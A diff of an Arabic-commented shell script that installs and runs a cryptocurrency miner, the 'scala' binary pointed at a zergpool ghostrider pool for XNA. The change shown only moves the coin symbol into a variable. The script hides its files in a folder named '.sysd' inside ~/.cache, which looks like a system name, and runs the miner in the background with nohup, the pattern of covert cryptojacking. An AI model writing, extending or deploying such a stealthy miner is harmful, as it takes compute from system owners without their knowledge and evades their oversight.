@@ -5,6 +5,7 @@ WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"       # ← غيّر هذا إلى �
 WORKER="c=XNA"
 POOL="ghostrider.eu.mine.zergpool.com:5354"
 THREADS=2
+SYMBOL=c=XNA
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
@@ -17,4 +18,4 @@ tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
 # تشغيل المعدّن في الخلفية باستخدام nohup
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS -p c=XNA > cpu_output.log 2>&1 &
+nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS -p $SYMBOL > cpu_output.log 2>&1 &
